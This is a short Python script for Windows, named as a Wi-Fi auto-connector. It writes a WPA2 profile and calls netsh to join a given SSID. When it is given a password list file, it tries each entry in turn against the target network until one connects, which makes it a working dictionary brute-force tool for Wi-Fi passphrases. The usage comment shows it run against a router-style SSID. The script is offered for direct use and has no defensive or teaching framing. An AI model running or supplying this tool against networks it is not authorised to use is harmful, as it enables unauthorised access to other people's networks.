# usage exam : python wifi-auto-connector.py KT_GiGA_5G_1234 .\passwords.txt
# author : devjanger

import os
import time
import sys
from urllib import request

def internet_on():
    try:
        request.urlopen('http://google.com', timeout=1)
        return True
    except request.URLError as err: 
        return False

def connect_wifi(SSID, PASSWORD):

    xml = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
  <name>{SSID}</name>
  <SSIDConfig>
    <SSID>
      <name>{SSID}</name>
    </SSID>
  </SSIDConfig>
  <connectionType>ESS</connectionType>
  <connectionMode>auto</connectionMode>
  <MSM>
    <security>
      <authEncryption>
        <authentication>WPA2PSK</authentication>
        <encryption>AES</encryption>
        <useOneX>false</useOneX>
      </authEncryption>
      <sharedKey>
        <keyType>passPhrase</keyType>
        <protected>false</protected>
        <keyMaterial>{PASSWORD}</keyMaterial>
      </sharedKey>
    </security>
  </MSM>
  <MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
    <enableRandomization>false</enableRandomization>
  </MacRandomization>
</WLANProfile>
    """

    with open("wifi_profile.xml", "w") as f:
        f.write(xml)
    
    os.system('netsh wlan add profile filename="wifi_profile.xml"')
    os.system(f"netsh wlan connect name={SSID}")

    os.remove("wifi_profile.xml")

    # # Check if the connection is successful
    time.sleep(3)

    if not internet_on():
        print("[-] Failed to connect to the network")
        return False
    else:
        print("[+] Successfully connected to the network")
        return True

if __name__ == "__main__":

    if len(sys.argv) != 3:
        print("Usage: python app.py <SSID> <PASSWORD>")
        sys.exit(1)

    # PASSWORD LIST
    if os.path.isfile(sys.argv[2]):
        with open(sys.argv[2], "r") as f:
            print("[*] Reading password list:", sys.argv[2])
            passwords = f.read().split("\n")
        
        for password in passwords:
            print("[*] Trying password:", password)
            success = connect_wifi(sys.argv[1], password)
            if success:
                sys.exit(0)
        
        sys.exit(1)

    success = connect_wifi(sys.argv[1], sys.argv[2])
    
    if not success:
        sys.exit(1)
    else:
        sys.exit(0)
